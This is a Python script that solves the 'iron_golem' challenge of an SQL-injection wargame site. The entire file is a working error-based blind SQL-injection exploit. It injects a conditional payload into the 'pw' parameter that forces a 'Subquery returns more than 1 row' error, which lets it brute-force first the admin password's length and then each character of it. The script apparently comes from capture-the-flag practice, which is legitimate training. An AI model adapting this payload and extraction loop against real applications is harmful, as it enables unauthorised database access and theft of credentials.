#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

def GetPwLength(t, s):
    for i in range(1, 101):
        try:
            payload = t + "?pw=' or id='admin' and if(length(pw)=" + str(i) + ", true, (select 1 union select 2))%23"
            r = requests.post(payload, cookies=(dict(PHPSESSID=s)))

        except Exception as e:
            print("GetPwLength() Error...")
            print(e)
            exit(1)
        
        if "Subquery returns more than 1 row" not in r.text:
            return i

def GetPw(t, s, lengthPw):
    tmpPw = ""

    for i in range(1, lengthPw + 1):
        for j in range(48, 128):
            try:
                payload = t + "?pw=' or id='admin' and if(substr(pw, " + str(i) + ", 1)=\"" + chr(j) + "\", true, (select 1 union select 2))%23"
                r = requests.post(payload, cookies=(dict(PHPSESSID=s)))

            except Exception as e:
                print("GetPw Error...")
                print(e)
                exit(1)
            
            if "Subquery returns more than 1 row" not in r.text:
                tmpPw += chr(j)
                break

    return tmpPw

if __name__ == "__main__":
    t = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
    session = "" #세션값
    pw = ""

    lengthPw = GetPwLength(t, session)
    print("Length of Password : %d\n" %(lengthPw))
    
    pw = GetPw(t, session, lengthPw)
    print("Password : %s" %(pw))